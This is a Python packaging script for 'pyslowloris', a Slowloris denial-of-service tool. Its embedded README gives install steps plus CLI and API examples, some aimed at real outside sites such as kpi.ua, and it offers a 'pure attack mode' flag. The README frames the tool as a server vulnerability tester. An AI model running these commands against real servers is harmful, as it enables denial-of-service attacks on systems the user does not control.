# -*- coding: utf-8 -*-
from setuptools import setup

package_dir = \
{'': '.'}

packages = \
['pyslowloris']

package_data = \
{'': ['*']}

install_requires = \
['fake-useragent>=0.1.11,<0.2.0',
 'jk-triologging>=0.2019.10,<0.2020.0',
 'sh>=1.14.0,<2.0.0',
 'trio>=0.16.0,<0.17.0']

entry_points = \
{'console_scripts': ['slowloris = pyslowloris.__main__:main']}

setup_kwargs = {
    'name': 'pyslowloris',
    'version': '2.0.1',
    'description': 'Asynchronous Python implementation of SlowLoris DoS attack',
    'long_description': '# PySlowLoris\n[![Gitter chat](https://badges.gitter.im/gitterHQ/gitter.png)](https://gitter.im/SlowLoris-dev/Lobby)\n[![License](https://img.shields.io/badge/license-MIT%20license-orange.svg)](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE)\n[![Python](https://img.shields.io/badge/python-3.8-blue.svg)](https://github.com/maxkrivich/SlowLoris)\n[![Build Status](https://travis-ci.org/maxkrivich/SlowLoris.svg?branch=master)](https://travis-ci.org/maxkrivich/SlowLoris)\n[![PyPI version](https://badge.fury.io/py/PySlowLoris.svg)](https://badge.fury.io/py/PySlowLoris)\n\nPySlowLoris is a tool for testing if your web server is vulnerable to slow-requests kind of attacks. The module is based on python-trio for Asynchronous I/O and poetry for dependency management. The idea behind this approach to create as many connections with a server as possible and keep them alive and send trash headers through the connection. Please DO NOT use this in the real attacks on the servers.\n\nMore information about the attack you can find [here].\n\n### Installation\n\n#### PyPi\n\nFor installation through the PyPI:\n\n```sh\n$ pip install pyslowloris==2.0.0\n```\nThis method is prefered for installation of the most recent stable release.\n\n\n#### Source-code\n\nFor installation through the source-code for local development:\n```sh\n$ git clone https://github.com/[username]/SlowLoris.git\n$ cd SlowLoris\n$ pip install poetry\n$ pyenv install 3.8.3\n$ pyenv local 3.8.3\n$ poetry env use 3.8.3\n```\n\n### Basic Usage\n\nAvailable command list:\n\n```sh\n$ slowloris --help\nusage: slowloris [-h] -u URL [-c CONNECTION_COUNT] [-s]\n\nAsynchronous Python implementation of SlowLoris attack\n\noptional arguments:\n  -h, --help            show this help message and exit\n  -u URL, --url URL     Link to a web server (http://google.com) - str\n  -c CONNECTION_COUNT, --connection-count CONNECTION_COUNT\n                        Count of active connections (default value is 247) - int\n  -s, --silent          Ignore all of the errors [pure attack mode] - bool\n```\n\n### Docker usage\n\n#### Download image from Docker Hub\n\nPull the image from [Docker Hub](https://hub.docker.com/r/maxkrivich/pyslowloris/) and run a container:\n\n```bash\n$ docker pull maxkrivich/pyslowloris\n$ docker run --rm -it maxkrivich/pyslowloris [-h] [-u URL] [-c CONNECTION_COUNT] [-s SILENT]\n```\n\n#### Build image from source-code\n\nAlso you can build image from [Dockerfile](https://github.com/maxkrivich/SlowLoris/blob/master/Dockerfile) and run a container:\n\n```bash\n$ docker build -t pyslowloris .\n$ docker run --rm -it pyslowloris [-h] [-u URL] [-c CONNECTION_COUNT] [-s SILENT]\n```\n\n**Note:** *Don\'t forget about \'sudo\'!*\n\n\n\n### Example of usage\n\n#### How to use module through Python API\nHere is an example of usage\n\n```python\nfrom pyslowloris import HostAddress, SlowLorisAttack\n\nurl = HostAddress.from_url("http://kpi.ua")\nconnections_count = 100\n\nloris = SlowLorisAttack(url, connections_count, silent=True)\nloris.start()\n```\n\n#### How to use module via CLI\n\nThe following command helps to use module from command line\n\n```sh\n$ slowloris -u http://kpi.ua/ -c 100 -s\n```\n###### stop execution: Ctrl + C\n\n\n\n### Testing\n\n#### Testing with real apache server\n\n```bash\n$ docker-compose up web_server -d\n$ .....\n```\n\n#### Module-tests\n```bash\n$ make pytest\n```\n\n### Bugs, issues and contributing\n\nIf you find [bugs] or have [suggestions] about improving the module, don\'t hesitate to contact me.\n\n### License\n\nThis project is licensed under the MIT License - see the [LICENSE](https://github.com/maxkrivich/SlowLoris/blob/master/LICENSE) file for details\n\nCopyright (c) 2017-2020 Maxim Krivich\n\n[here]: <https://en.wikipedia.org/wiki/Slowloris_(computer_security)>\n[bugs]: <https://github.com/maxkrivich/SlowLoris/issues>\n[suggestions]: <https://github.com/maxkrivich/SlowLoris/issues>\n',
    'author': 'Maxim Krivich',
    'author_email': 'maxkrivich@gmail.com',
    'maintainer': None,
    'maintainer_email': None,
    'url': 'https://github.com/maxkrivich/SlowLoris',
    'package_dir': package_dir,
    'packages': packages,
    'package_data': package_data,
    'install_requires': install_requires,
    'entry_points': entry_points,
    'python_requires': '>=3.8,<4.0',
}


setup(**setup_kwargs)
